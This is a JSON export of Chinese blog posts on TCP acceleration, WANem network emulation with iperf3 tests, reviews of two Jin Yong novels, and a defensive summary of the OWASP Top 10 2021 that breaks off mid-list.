[{"content":"传输控制协议（TCP）是我们的老朋友了，它力求在不可靠的IP网络上实现可靠的数据传输，也就是使得数据包有序、无丢失和不重复，因此，引入了如校验、序号、确认、重传等机制。同时，这位老朋友也是比较负责任的，在网络拥挤时，为了不使情况雪上加霜，它引入了慢启动、拥塞避免等机制。\n现在的网络世界中，我们日常进行的网页浏览、游戏、视频等活动都离不开TCP。随着网络的发展，网络上面承载的数据包越来越多，在为多数人所共享的广域网上，在人们上网的高峰期，网络会存在一定的拥塞，反映到我们的上网体验上，就是延迟和丢包。加载个网页要花掉十几秒、玩个王者荣耀时不时延迟200+、看视频卡顿等，除了设备的问题，恐怕网络拥塞难辞其咎。在这样的背景之下，TCP加速技术也就产生和发展了。\n实际上，TCP加速也不是一个新的概念了，十几年前就有相关的研究，但是这一理念在现今的背景下显得较有意义，我们对其进行一些学习和实践，大概不算是浪费时间的。\n两种方案 TCP加速可以从几个角度来进行分类，较为常见且易懂的是从加速方案的部署位置来分。如果只在客户/服务器的某一边来部署TCP加速，就叫做 单边加速 ，如果双方都要部署，就叫做 双边加速 。两种方案一般有不同的使用场景，单边加速常部署在服务端上，这样就能透明地提升用户的访问体验；双边加速常常是双方协商好的一套加速方案，因此不能做到透明，可以用在客户端和服务端都可控的场景中，比如在个人云服务器上运行着某项服务，此时可以在自己的客户端PC和服务端都部署TCP加速，来改善访问体验。\n单边加速概述 单边加速方案只需要由客户或服务端的一方来部署，比较简单，且对对方是透明的。我们首先要知道TCP是怎么工作的：在 协议规定 的运行模式下，发送方的系统 产生和处理数据 、 把数据交给网卡 、网卡发送数据，接收方接收数据、把数据交给系统、处理数据。从这一套流程中，我们应该发现几个可以下手的地方，每个地方都尝试一下，我们对TCP加速的认识也就差不多了。\n数据包处理优化 说是数据包处理优化，其实就是所谓的“网络性能优化”。这个概念跟TCP协议本身没有太多关系，主要是针对收发数据双方的硬件、操作系统等进行优化。\n减少复制 按照上面说过的流程，发送方的系统要产生和处理数据，然后把数据交给网卡。这一步是一个复制的过程，也就是将数据从系统或者应用程序所在的内存空间复制了一份到网卡的内存空间。这一步是可以优化的，有下面这几种办法。\n直接访问网卡存储空间 。这种方案取消了复制，而采用地址映射或直接访问的办法，相当于将网卡看作了操作系统的一部分。为了实现这种方案，网卡要具备一定的智能性，否则无法支持多应用的访问，也无法在合适的时机传递数据。\n与网卡共享存储区域 。让网卡用DMA或其他什么方式来访问内核内存空间，比上面的方案简单一些，对网卡的要求少一些。\n其他各种内存映射方案 。内存映射可以实现应用、网卡和内核三者的内存共享，无论是什么内存映射方案，核心都是减少复制。\n减少中断 系统要把数据交给网卡，或者网卡收到数据要交给系统的时候，一般都会触发中断。操作系统处理中断是需要花费时间的，因此这一步也是可以优化的。\n将异步触发变为轮询 。有些研究者将TCP/IP的处理放置到一台单独的设备上，这样，就可以将协议数据的收发处理由中断的方式改变为比较简单的系统轮询。轮询的频率是要仔细调整的，太慢则数据处理产生延迟，太快则系统负载过大。\n中断合并 。中断合并就是将多个中断合并到一起处理，也就是不在每次收到数据时产生中断，而是在数据积累到一定的量时再产生一次中断。这种方案使得延迟跟报文长度有关系了，且在处理数据的时候可能一次处理了多个报文，应用程序的调度也受到一些影响。\n增加单个报文的长度 。思想和中断合并是类似的，就是将报文数据积累到一定长度再发送。但这一步是交给上层协议来完成的，跟中断合并时有区别的。\n报文过滤 。总会有一些报文是没意义的，比如一些广播数据、一些没用的UDP报文，这些数据直接交给网卡来过滤，就能够减少中断。\n用户级传输协议 传统的协议处理是在用户空间内完成的，因此要减少复制，只能引入各种内存映射或共享的方案。人们可以在用户空间实现传输层的协议，节省了数据复制的时间。\nTCP卸载引擎 将软件执行转移到硬件执行，一直是性能优化的不二法门。如果在网卡硬件上运行一些特殊的系统，使得数据处理等步骤直接由网卡完成，那末系统的负载就小了，执行起来就快了。\nTCP卸载引擎的缺点是存在的，那就是网卡硬件性能的提升要与系统其他硬件保持同步，否则还是可能成为传输速度的瓶颈；当然，要在网卡上实现数据处理的系统，本身的硬件和软件的设计难度也是很大的。\n协议细节优化 数据包处理优化实际上就是针对机器本身的“网络性能优化”，而协议细节的优化才真正关乎TCP协议本身。\n拥塞控制优化 TCP的拥塞控制机制我们是熟悉的，那就是：慢启动、拥塞避免（加法增加、乘法减少）。其实在这两个机制的基础上，延伸出的快重传和快恢复也属于拥塞控制的优化，当然我们还要有更多的尝试。\n针对拥塞状态的判断 。我们如何判断网络是否拥塞呢？TCP协议一般以超时和重复ACK为标准。超时意味着不仅自己的数据没有到达，对方的重复ACK也没有到达，网络的拥塞情况已经比较严重了，因此传统的处理方法是将发送窗口减到 1 ，阈值减半，重新开始慢启动。重复ACK意味着自己的数据没有到达，对方的ACK可以到达，网络的拥塞情况还不那么严重，因此传统的处理方法是将阈值减半，发送窗口减到阈值大小，重新加法增加。慢启动和加法增加都是保守的，对带宽不一定有充分的利用，尤其当网络出现了小波动的时候，如果误判为拥塞，就会导致传输速度骤降，而带宽空闲。\n有若干种针对拥塞状态的判断方案，例如zetaTCP使用了动态学习的方法判断拥塞，过滤非拥塞情况引起的丢包现象，预判拥塞丢包的概率并基于这一概率直接重传。Fast TCP结合延迟信息反馈来判断拥塞，Westwood结合带宽测量的技术来判断拥塞。\n参数调节 TCP协议的参数是指预先写好的、控制协议工作的一些参数，如用于进行拥塞避免的拥塞窗口阈值，用于传输数据的MTU，用于判断超时的超时时间等。针对这些参数进行仔细的调节，可以一定程度达到TCP加速的目的。\n并行TCP 并行TCP的理念是将原本的一条TCP连接修改为多条TCP连接，将原本使用一条连接来传输的数据放在多条连接上传输。这种思路归根到底是对拥塞避免算法的改造，原本一条连接上的拥塞避免算法，其强度在改为多条连接之后得到了削弱。例如原本的拥塞窗口是 N ，改成 k 条连接之后就成了 kN ，每次在拥塞避免时还是只把阈值减少 N/2 ，对总的窗口的影响就没那么大了。\n双边加速——以UDP Speeder为例 双边加速要求在客户端和服务端都部署相同的加速方案，常规思路是把复杂的TCP协议转化为私有的协议。使用私有协议，可以对数据包处理、重传/拥塞避免等机制进行调整，从而达到加速的目的。\n以开源的 UDP Speeder 为例，该系统在客户-服务器之间架设了一条隧道，在隧道中传输的数据使用了前向纠错编码，使得数据即便在传输过程中产生了一些错误和丢失，也能通过冗余的编码数据来把原始数据恢复过来。\n在客户端，UDP Speeder会开放一个监听端口，监听用户给到的数据；会开放一个发送端口，用于把数据发送到远端服务。监听端口收到数据之后，首先进行编码等处理，然后将数据通过发送端口发送出去。\n在服务端，UDP Speeder也会开放一个监听端口，监听来自广域网的数据；根据收到的数据管理连接，每个连接对应一个独立的发送端口，用于把该连接的数据发送给服务程序。监听端口收到广域网传来的数据后，首先进行解码，纠错/恢复传输过程中收到影响的部分，然后送到该连接对应的发送端口，发送给服务程序。\n从UDP Speeder中，我们看到双边TCP加速的基本理念，就是针对数据进行一个双方协商好的处理，其目的是提高带宽的利用效率，减少不必要的数据重传等。UDP Speeder只能实现针对UDP数据的加速，但是配合基于UDP的VPN程序，如Open VPN等，可以实现对TCP的加速。\n我对UDP Speeder的源码进行了分析，如果希望更加细致的了解它的工作流程，下面的两张图可以起到帮助：\n\r客户端\r\n\r服务端\r\n参考资料 [1] 王圣,苏金树.TCP加速技术研究综述[J].软件学报,2004,15(11):1689-1697\n[2] 王建新,彭娜.广域网加速技术研究综述[J].技术交流.2009,5\n[3] 钟琳华.深度解析ZetaTCP单边加速技术[J].技术研发.2015\n[4] David X. Wei,Cheng Jin,Steven H. Low, et al.FAST TCP: Motivation, Architecture, Algorithms,Performance[J].IEEE/ACM TRANSACTIONS ON NETWORKING,2006,14(6):1246-1258\n[5] Giuseppe Siracusano,Roberto Bifulco,Simon Kuenzer et al.On-the-Fly TCP Acceleration with Miniproxy[J].Extended version of paper published in ACM HotMiddlebox.2016,5.\n[6] Tom Kelly.Scalable TCP: Improving Performance in Highspeed Wide Area Networks[J].2002,12.\n[7] 蒋建军,陆平.基于 TCP 协议加速的单边加速模型研究与实现[J].信息技术,2015(2):160-164\n[8] 林睿.基于 4G 核心网透明代理进行 TCP加速的效果分析[J].通信设计与应用.2020,2.\n[9] 彭娜.并行TCP在广域网加速系统中的研究与实现[D].中南大学.2009.\n[10] 赵欣,时向泉,吴纯青.支持TCP/IP卸载引擎的协议栈的设计与实现[J].微电子学与计算机,2006(S1)\n[11] S.Floyd.RFC.3649.HighSpeed TCP.2003\n","date":"2021-11-25T00:00:00Z","permalink":"https://xrg.fj.cn/p/tcp%E5%8A%A0%E9%80%9F%E6%8A%80%E6%9C%AF%E7%AE%80%E8%BF%B0/","title":"TCP加速技术简述"},{"content":"我们可能遇到这样的情景：有一些实验需要在广域网环境下（存在一定的延迟、丢包等）完成，但我们不希望花费成本去租借一台云服务器，只希望在虚拟机网络中模拟出广域网的环境，应该如何实现呢？\n本文是TCP加速系列总结的一部分 ，我们希望完成TCP加速的实验，这时要求我们的实验环境不仅是一个广域网，还需要是一个存在 一定拥塞 、会发生 一定丢包 的广域网，这种情况下，如果我们不使用模拟环境，而使用真实服务器的话，实验效果就可能受到服务器地理位置、实验时间段等等因素的影响了。\n好在，我们可以使用WANem这一稳定、易用的广域网模拟器来解决我们的问题。\n简介 WANem基于iptables和tc（Traffic Control）实现，可以实现对网络延迟、丢包率、抖动、噪音等的模拟，使用者可以简单地设定并复现出某个特定的网络环境，因而逐渐替代软件仿真成为新一代的网络测试床。与之具备类似概念的工具有微软的Network Emulator for Windows Toolkit（NEWT）、Linux 2.6自带的Netem等。事实上，此前说的tc（Traffic Control）就是用来控制Netem工作的，因此可以理解为WANem是基于Netem所构建。\n安装与访问 WANem类似于一台虚拟机，可以直接 下载 iso文件，并在VMWare中安装。Linux类型选择 其他Linux 64位 即可。\n启动之后，可以使用DHCP获取IP，或者手动配置IP；虚拟机会要求你设置口令，你可以使用用户名 perc 和你设置的口令来远程登录到系统上。\n成功启动之后，会出现 WANemControl@PERC\u0026gt; 的命令行提示符，使用 help 命令可以查看该命令行支持的命令。\n一般来说，你现在就可以在另一台机器的浏览器上使用 http://\u0026lt;WANem IP\u0026gt;/WANem 来访问控制界面了（注意URL大小写）。假如你不知道WANem的IP地址，则使用 exit2shell 命令来返回到Linux命令行中，使用我们熟悉的 ip addr 命令就可以看到WANem的IP。\n\r成功访问WANem\r\n配置规则 首次进入控制界面时，我们看到的是WANem的 Basic Mode ，这个模式下，我们可以配置 带宽 和 延迟 。\n点击导航栏中的 Advanced Mode 进入高级配置，我们看到如下的界面：\n\rAdvanced Mode\r\n界面上已经将各项指标都标识得比较清楚了，因此不多费口舌解释。在上图中，我们已经写好了一条”延迟100ms、随机丢包率20%“的规则。\n可以指定我们的规则的适用范围，如果你只希望你配置的规则在两台特定主机之间生效，那么就填写下图红框框出的一行，否则保留原样即可。\n\r规则\r\n使用 保存我们设置好的规则，即刻开始使用它吧。\n我们的两台实验机器分别是 CentOS7 192.168.213.128 和 Ubuntu 192.168.213.129 ，WANem是 192.168.213.130 。\n首先可以使用 iperf3 来测试一下两台机器之间的网络情况（理所当然地好）。\n在Ubuntu上运行 iperf3 -s 命令：\n\riperf server\r\n在CentOS上运行 iperf3 -c 192.168.213.129 命令，该工具将会自动测试从客户端到服务端的带宽情况：\n\riperf client\r\n接着，我们引入WANem。在CentOS上添加路由，使得它到Ubuntu的所有流量都要经过WANem。\n\r添加路由\r\n再次使用 iperf3 -c 192.168.213.129 进行测试，效果很明显：\n\riperf client\r\n可以看到，首先由于时延的影响，带宽下降了，其次是产生了一些丢包。\n我们可以使用 iperf3 -u -c 192.168.213.129 命令来启用UDP模式，该模式下会统计丢包率，可以看到这里的丢包率跟我们此前设置的 20% 是接近的。\n\riperf UDP\r\n综上所述，有了这个环境，就可以愉快地在局域网中模拟出广域网环境了。\n参考资料 [1] 微信测试工程师手把手教你做弱网络模拟测试 - 知乎\n[2] Linux网络流量控制工具—Netem - 发卡 - 博客园 (cnblogs.com)\n[3] TC(Traffic Control)命令—linux自带高级流控 - 云+社区 - 腾讯云 (tencent.com)\n[4] 彭娜.并行TCP在广域网加速系统中的研究与实现[C].中南大学硕士学位论文,2009-05\n[5] https://sourceforge.net/projects/wanem/files/Documents/WANemv11-Setup-Guide.pdf/\n","date":"2021-11-23T00:00:00Z","permalink":"https://xrg.fj.cn/p/tcp%E5%8A%A0%E9%80%9F%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAwanem/","title":"TCP加速之环境搭建（WANem）"},{"content":"距离我废寝忘食地读完《倚天屠龙记》不到两周，我又以相同的热情读完了《连城诀》。\n自我读完《倚天》之后，便暗自下决心少读金庸小说，第一是因为金庸先生的小说实在写得精彩，很容易使我不去做其他事情而专门来读，第二是金庸先生的小说总是包含很深长的意味，读完之后总是如饮烈酒，思绪震荡。\n我在中学时几乎读遍了金庸小说，最喜欢的几本中便有一本《连城诀》。读完《倚天》之后便把《连城诀》加入到我的电子书库中，不出十天，便翻开了第一页，翻开之后，两天的时间内便整本读完了。\n《连城诀》几乎是金庸小说中最现实的一本，它的情节之压抑，令人觉得自己仿佛不是在读武侠小说。小说淋漓尽致地展现了人性中的”贪“，叙述了由贪念引出的一系列不公平事，几乎是直指着苍天的鼻子，质问着何为”善有善报，恶有恶报“。\n故事的核心正是《连城诀》，这是一本武功秘籍，也是一份巨大宝藏的索引。然而，主角狄云的悲惨命运的起点，与这本书并无关系。师徒三人从乡下来到万震山的家中为他贺寿，万家八名弟子对戚芳见色起意，设计将狄云陷害成强奸未遂的淫徒，使他右手五指被削、穿了琵琶骨、关入死囚狱中。在这里，狄云认识了丁典，当狄云知道师妹将要嫁给仇人之后，试图自杀，从此取得了丁典的信任。狄云初步习得了丁典的《神照经》，而在一个雨夜中，丁典意识到自己深爱的女子已经逝世，带着狄云越狱前去确认她的死活，受到了知府凌退思的暗算，亦踏上了黄泉。狄云承接了丁典与凌霜华合葬的遗愿，开启了江湖上的游荡生涯。他带着丁典的尸身在机缘巧合下来到万家，见到了戚芳，与万圭冲突，被戚芳所救，又受到宝象僧的追击，在破寺中侥幸毒死宝象，火化了丁典，又遇到铃剑双侠和血刀老祖，被一系列巧合裹挟着来到西域雪谷，眼见血刀老祖击败江南三侠、受到血刀老祖的毒手、冲开任督二脉、与花铁干和水笙周旋、最终众人进入雪谷、与水笙一同遭到众人的误会、开启了新一段的漂泊。故事进入最后一大部分，是狄云从雪谷中出来之后，见到言达平、解救万圭、与戚芳同时知晓万家的毒计、眼见戚芳死亡、追寻言达平来到宝藏所在的地方、眼见众人因为抢夺财宝而全部死伤、最后万念俱灰回到了雪谷，见到了水笙。我在中学时候，正是天真烂漫的年纪，对甚么明争暗斗的情节完全没有任何的理解，只觉得水笙对狄云从最初的厌恶、到误会的消除、再到最后见到狄云的欣喜，这样的转变真是令人非常欣慰的，因此对这一部书还蛮喜欢；如今，我从前所觉得无关紧要的那些情节，突然变得无比真实、无比血淋淋的，从前最欢喜的情节，倒成为了两个蒙受大冤之人的一笔简单结尾，并不十分地令人振奋了。\n现下读来，整个故事基本没有令人大感愉悦的部分，没有快意恩仇、没有行侠仗义、没有男女暧昧、没有家国情怀，《连城诀》就是单纯地描写了众人如何受到心中贪念的驱使、而加入一场场狠毒的暗算、闹哄哄的抢夺中。在这一环套一环的心计下，全书中最憨厚老实的狄云受到了无数不明不白的冤屈，且最终也没有正式地将这些冤屈洗清。其实，在狄云心中，这些冤屈的洗清，大抵已经不重要了，他心爱敬重的人一个接一个地死去、或显露出狰狞的面貌，一个人受到打击如此，如何还会去在意万两黄金、沉冤昭雪呢？\n不知在哪里见到过一句话：“《连城诀》是金庸小说中最为现实主义的一部”。的确，相比于正气凛然、善恶得报的其他武侠作品，这部书中只有无尽的暗算和冤屈，使得读者不禁要质问上苍：这样的世界你不要管管么？然而质问是无力的，我们在现实的世界中，何尝少了勾心斗角、明枪暗箭，何尝见到人恶天收、人善天佑呢？相比于我从《倚天屠龙记》中读到的家国、善恶、男女等等一系列的主题，《连城诀》的主题可单调许多，单只有从人性中的”贪“所引发的思考，其深远和分量却毫不逊色了。\n","date":"2021-10-22T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%86%8D%E8%AF%BB%E8%BF%9E%E5%9F%8E%E8%AF%80/","title":"再读《连城诀》"},{"content":"概言 《倚天屠龙记》是一部好作品。\n距离上一篇读书小记已有半年多了，这半年并非全无读书，而是读了大部头而还未读完（《三国演义》），或者读了论述类的书（《乡土中国》）而尚未理解得很深刻，自然没有办法产出什么读书感想。\n其实，我从以前就说我不大喜欢读小说，尤其是长篇小说，这点后面一定要讲讲。\n言归正传，从我再一次翻开《倚天屠龙记》，到我看完最后一页而无比怅然，只花了三四天的时间。犹记得中学时期，学校总是强调不要看武侠小说，甚至在武侠小说之前加上了“沉迷”二字，俨然将其视为了一种猛烈上瘾的毒药；这几天下来，颇不认同。小说就是小说，小说都是写人物的、讲故事的，不应有“沉迷某某小说”这种针对性的表达。所谓“沉迷”，只能是作者把人物写得太生动了，把故事讲得太精彩了，使读者流连于小说的世界之中，但是既然如此，“沉迷”武侠小说，和“沉迷”四大名著、“沉迷”外国经典，也就没有多大的区别了。\n我先说“沉迷”武侠小说的说法是错误的，但我这几天确实是“沉迷”了，沉迷在在这片快意恩仇的江湖里，甚至没有心思抽出身来打打游戏。\n我想《倚天屠龙记》之精彩，其一在于“大情”和“小情”的调和，这是文意方面；其二在于金庸先生对人物的塑造，一个个角色都是有血有肉的，他们的嬉笑怒骂如在眼前，读者并不是以冷酷的第三者的身份来看完整篇故事，而是仿佛跟随在这些人物身边去目睹一切了。\n中学时看过几遍《倚天屠龙记》，但年岁渐长，心境也不同往日。旧时的记忆只限于跟张无忌相关的部分，这次重读，半生半熟之间自然有新的感悟。\n全书可以分为几个大的部分，张无忌成年以前的部分均为铺垫，张翠山和殷素素相识相恋、冰火岛等情节尤其精彩；张无忌回归中土之后，幼年时期的情节单列一部分，此时的无忌完成了从天真纯粹到初尝世事的转变，他父母的自尽、身受玄冥神掌之后被太师傅带着四处求医、蝴蝶谷的生活、带着不悔妹妹的漫漫西行之路、受了朱家的欺骗……身处乱世，这样的经历不可不谓命途多舛，但张无忌始终承受下来了，一次次的磨砺都带着一次次的机缘，与周芷若的相识、一身医术的修成，都在此时。\n第三部分是光明顶解围。修成九阳神功之后，在光明顶结识小昭、练成乾坤大挪移、力服六大派，而成为明教教主。这部分是张无忌人生中的第一个高光，实则也是全书中“大情”的第一次体现：学武之人应当胸襟开阔，江湖各派应该精诚团结、共克外敌。光明顶一战，无人不服这一年轻而高尚的侠士。\n第四部分是解救群雄。光明顶之后，蒙古势力介入捡漏，各大派人物为赵敏所擒。张无忌先到少林，后到武当，于武当山顶学会了太极，十分漂亮地解了一次围。而后万宁寺一战，救出群豪，也是精彩。这一部分，张无忌与赵敏相识，而后情愫暗生，成为全文“小情”的重要部分。这一部分是周芷若命运的转折点，由于灭绝师太心中那无法放下的成见，使得一位少女早早结束了她天真可爱的时期，而被迫修练城府，终于带来一场凌乱的冲突，十分可悲可叹。\n第五部分是出海与归来。张无忌一行人前往灵蛇岛，在那岛上寻得谢逊、与波斯总教产生矛盾、与小昭东西永隔、回程时殷离身死、赵敏受冤……这部分是“小情”的主舞台，张无忌与四个女子之间剪不断理还乱的情感，使得我在看这一部分时相当痛苦。与波斯人的冲突最终还是稍逊一筹，小昭被迫成为总教教主，远赴波斯，从此永别（在小说中永别了），殷离身死、赵敏蒙冤，张无忌的情感聚焦到了周芷若和谢逊身上。我先前已说了，所谓“沉迷”其中，是指情节和语言精彩绝伦，使读者如同目睹一切，感受一切；然则我也亲历了张无忌与四女的情感波折，四段感情迫于外力一段段地终了，最终剩下与周芷若的情感，也没有一个清晰的界定，真是愁死人也。\n第五部分是再回中土之后，与周芷若的冲突、与赵敏的重逢、多次营救谢逊、共抗元兵、携手归隐。这部分是文章的最后一部分，也是“大情”和“小情”的高潮。在这部分，张无忌将“小情”理出了头绪，即先义父、后男女，主赵敏、副他人。为救义父，不惜与赵敏一同离开婚礼现场，与周芷若彻底冲突；而随着营救进程的发展，无忌也认清了自己心中真正所爱的角色是赵敏。这部分是全文中第二次聚集天下英杰，元兵的到来也使得武林人士精诚团结、共抗外敌，是“大情”的又一次集中表达。\n大情 我认为一篇小说当中不应该只有小情。\n这里的大情，是指对人物关系之外的、更高一级的问题的思考和体现。《倚天屠龙记》当中至少体现了两个深刻的问题：\n 正与邪的对立统一。 主与次的矛盾冲突。  从张翠山和殷素素的关系开始，就在表达一个问题：正与邪是绝对对立的吗？殷素素是天鹰教的公主，原本杀人不眨眼，但为情所动，成为了一个温柔的妻子、温柔的母亲，这样的人，能称之为邪吗？\n谢逊的转变，赵敏的转变，均是邪转为正的例子；何太冲原本也是一派掌门，贪念一起，便始终纠结于谢逊与屠龙刀，甚至于光明顶偷袭失败而刺死了华山派掌门、夜晚私闯关押谢逊的地方而被渡劫三人击败、被成昆杀死，这是正转为邪的例子。其实，书中的人物均是灰度的，以正邪为白黑，张三丰和成昆为两个极端的人物，其余人物几乎都亦正亦邪。张无忌一身正气，也难免对四女贪心不足，情感纠缠不清，是大正而小邪；赵敏是害苦了俞岱岩等人的幕后黑手，而也难逃男女之情的影响，向张无忌代表的正方靠拢过去；明教诸人更不必提，总是以邪魅手段行正义之事，倒也有趣。\n主与次的矛盾冲突是另一个大问题。文章的背景是元末，主要矛盾其实是朝廷与百姓、与江湖群侠的冲突，其余江湖各派、派内各种人物的冲突，是次要的。但是全文基本以次要矛盾为核心，没有过多地呈现当时的主要矛盾，或者说主要矛盾只存在于诸人的豪言壮语中，这是受到了题材的限制。讲带兵打仗、驱除胡虏，不讲内功外劲、江湖恩怨，这武侠小说便没东西可写。但是在次要矛盾之中，处处体现主要矛盾，各派之间争斗之时，总有人试图将这些斗争消融掉，呼吁各方团结起来对付元朝；在朱元璋对张无忌施压的内部斗争情节中，也有人呼吁以抗击外虏为主。最后各方终于团结在少室山上，共同抵御元兵，是次要矛盾转向主要矛盾的一次升华。\n主次矛盾在各方的视角当中是不一样的。从第三者视角来看，当然是恢复失地、推倒暴虐的朝廷为要；代入各派中的人物来看，主要矛盾却是杀害师兄弟的不共戴天之仇敌，这也无可厚非。着眼大局、放下私人恩怨是一种修为，不能强调所有人都要有这种修为，这种局部视角下的主要矛盾其实是灭绝师太身死、周芷若悲剧的一个重要成因。\n其实，正与邪的对立统一也应当属于诸多矛盾中的一种。我在这里说的第一点强调的是“对立和统一”，第二点强调的是“主要和次要”，并不属于重复。\n至于从前的阅读理解题里面常常说的“歌颂了人物的某某性格”、“反映了某某高贵品质”云云，但凡成点气候的小说，便不会不突出人物的性格品质，写在这里是浪费笔墨。\n小情 小情实则不小，相反，乃是使人物丰满之关键。没有小情，小说里写出来的便是木头而不是人了，但相比于宏观的、较大的问题，人物身上所系的一些情感，只能称之为小情。\n《倚天屠龙记》的后记当中讲到，这一部小说主要强调的不是男女之情，而是江湖当中的好友、师长之情。在我读来，其实二者的含量是差不多的，好友、师长之情描述虽多，而其味不浓，男女之情虽然一直并不直接地表达出来，但寥寥几个情节便令人如饮烈酒，思绪无穷。\n好友、师长之情确实是一大重点。张无忌和太师傅、和明教当中的教众、和谢逊，都有非常不一般的情谊，张三丰和张翠山、或者武当七侠之间的情感，亦不逊色。男人是很向往这样的情感的，而武侠小说所描绘的这类情感很多，因此在固有的印象中，学生时期痴迷于武侠小说的群体中还是男生较为多一些。\n男女之情的部分则当真是千回百转。张翠山和殷素素好一对天作之合！张无忌和小昭、赵敏、周芷若，殷离和她心中的那个小鬼……这一类感情真是非常复杂，无论是喜是悲读起来都使人非常惆怅。寻常作品当中写男女之情，能有一二缕复杂关系，便叫人难以把持，而书中若干对男女被金庸先生刻画得如此生动，不愧是一代大师。\n我想在这一部分中，谈谈我对这部作品的总体感受和一些其他的联想。\n此前已讲过，《倚天屠龙记》是大情和小情交融在一起的，恰如那阴阳并济的九阳真气那样，很醇厚。小说是要有这样的水平，才堪称好作品；《三国演义》如没有始终怀抱“兴复汉室、还于旧都”愿望的蜀汉，便是三派军阀混战，无甚特别的魅力，这部作品中凌驾于个人之上的大情是家国情怀、君臣之义。读者总是希望从作品中读出一些情节之外的东西，如此感悟才深、回味才隽永。\n小说是以小情结尾的，周芷若要求张无忌不跟赵敏拜堂成亲，但不反对他们做夫妻，原文写道：\n 张无忌奇道：“你这样跟我们为难，有什么用意？”周芷若嫣然一笑，说道：“你们尽管做夫妻、生娃娃，过得十年八年，你心里就只会想着我，就只不舍得我，这就够了。”说着身形晃动，飘然远去，没入黑暗之中。\n 这样作为落幕，好不厚道，留下的空间实在太大，回味实在太多；我昨晚读完全书，犹如饮下一杯极苦极苦的浓茶，一直到深夜都还辗转反侧，全放不下对这几个人的牵挂，讲不清是一种什么感觉。\n很开始的时候便说：我是比较不喜欢读小说，尤其是长篇小说的。我们既然要读书，便该读佳作，既是佳作，便是其中一个微不足道之人物，也被作者用深厚的功底刻画得栩栩如生，更休提主角。读完一本长篇小说，便是与主角一道生活了好几天，想主角之所想，见主角之所见，他的喜怒哀乐只在眼前，对这个人物的情感已是很深；读完全本，合上书页，这个人物便是“飘然远去，没入黑暗之中”，于我来说，不是读完了一本书，而是失去了一个极好的朋友，怅怅然不知所措。“早知如此绊人心，何如当初莫相识”，正是我不喜欢读长篇小说的原因了。\n","date":"2021-10-10T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%86%8D%E8%AF%BB%E5%80%9A%E5%A4%A9%E5%B1%A0%E9%BE%99%E8%AE%B0/","title":"再读《倚天屠龙记》"},{"content":"2021版本的OWASP Top10已经出炉，目前处于同行评审阶段。本博客上已有2017版本的归纳总结，考虑到后面几年时间内，该版本（2021版）的Top10将可能对行业产生较大的影响，现单列一篇，总结其内容。\n 截至本文发布，该版本已经定稿\n 0 总览 新版本相较于2017版，引入了3个新类别（Insecure Design、Software and Data Integrity Failures、SSRF），修改了原有4个类的名称，以及进行了一些类别的整合。\n\r变化\r\n这一版Top10综合考虑了大数据和行业调查的结果；由于安全人员需要对大数据分析得到的漏洞进行验证和测试，为了保证结论的与时俱进，该机构对一线安全人员进行了问卷调查，由他们来对大数据分析的结果进行补充。\n1 Broken Access Control 失效的访问控制 是原榜单的 No. 5 ，现在来到了第一位。在 秋招 | 一些知识点 (gitee.io) 这篇文章中已经对这一安全问题进行了解释，在此不妨再重复一遍。\n访问控制策略使得所有用户都只能在其对应的权限之下行动，而失效的访问控制将导致未授权信息的读取、修改、销毁，或导致用户执行其权限之外的功能函数。一般的访问控制漏洞包括以下几点：\n 攻击者可以通过修改URL、应用内部状态、HTML页面或使用API攻击工具来绕过访问控制检查； 允许攻击者将数据库主键设置为其他用户，从而导致查看或修改其他用户的信息； 提权。未登录时能够执行已登录用户的操作，或已登录用户执行管理员操作； 修改元数据，例如JSON Web Token（JWT）的重放或伪造，cookie或隐藏元数据字段的伪造，从而进行提权； CORS（跨域资源共享）配置不当，从而导致未授权的API调用； 在未登录状态下通过目录遍历找到了需要登录才能访问的界面，或同理找到了管理员界面。  防护措施 ：\n 只开放公共资源，其余资源默认禁止访问； 只实现一种访问控制机制，贯彻落实到整个应用中； 访问控制模型要明确每一条记录的拥有者，不允许用户随便创建、读取、更新、删除记录； 记录失败的访问控制，并及时告警。  2 Cryptographic Failures 密码算法失效 旧称 敏感数据泄露 ，是原榜单的 No. 3 ，现在来到了第二位。敏感数据泄露是现象而非本质，新版本将其表达修改为更加接近问题根源的形式。\n人们总是需要考虑数据传输、存储、处理过程中的保护需求，诸如口令、信用卡号、个人信息等数据需要提供额外的保护；一般来说，只要是法律规定的敏感数据都需要进行严密的保护。参照欧盟的GDPR、金融业的PCI DSS等文件，数据保护要考虑如下的问题：\n 数据明文明文传输问题； 在默认配置或较老的代码中使用了脆弱的密码算法； 使用了默认的/脆弱的/重复使用的密钥，或密钥没有得到妥善的保管； 没有强制进行加密； 客户端没有对服务端证书进行验证。  防护措施 ：\n 对没必要存储的敏感数据予以及时销毁，存储的敏感数据确保加密。 使用最新的、强大的算法、协议、密钥，且密钥妥善管理。 确保数据传输过程中受到加密保护，如使用HSTS。  3 Injection 2017版本的OWASP Top10将注入漏洞排在第一位，因此相信很多人都对此有所了解。\n以下的情况可能导致注入漏洞的出现：\n 用户提供的数据没有经过应用程序的验证、过滤； 未经过转义就将动态请求或非参数化的API调用放入解释器执行； 恶意数据被直接使用或拼接使用。  防护措施 ：\n 将数据和可执行的命令/查询语句分离。 使用安全的API，避免完全使用解释器，提供参数化的API调用方式。 对输入设置白名单，或进行输入验证。 转义特殊字符。 在查询中使用 LIMIT 或其他SQL控件，防止SQL注入时大量地泄露记录。  4 Insecure Design 你从未见过的船新种类\n新版本中新增的 Insecure Design 主要关注由程序设计和架构上的缺陷所引起的安全风险，由此建议人们更多地在工程中使用对威胁进行建模，使用安全的设计模式和参考架构。\n不安全设计 其实是一个较为宽泛的类型，其下包含若干常见的脆弱点，但基本可以归纳为“缺失或无效的控制设计”（missing or ineffective control design）。\n防护措施 ：\n 与安全专家一起建立并使用安全的开发流程，对现有的安全或敏感数据相关的控制措施进行评估。 在安全的模式下构建并使用库/组件。 对重要的认证、访问控制、业务逻辑、关键流程等模块进行 威胁建模 。 编写单元和集成测试，以验证所有关键流程是否能够抵抗威胁。  5 Security Misconfiguration 不安全的配置 是原榜单的 No. 6 ，现在上升了一位。随着软件的可配置性逐渐变强，这一安全问题的加剧也就不足为奇了。\n应用中常见的不安全配置有：\n 云服务中的权限配置错误； 安装或启用了不必要的特性（如非必要的服务、端口、页面、账号）； 仍在使用默认的账号或密码； 把应用的报错信息泄露给了用户； 系统升级之后没有及时启用新的安全特性； 没有在开发/服务框架中配置好安全属性； 服务端没有向客户端发送安全相关的指令或消息头； 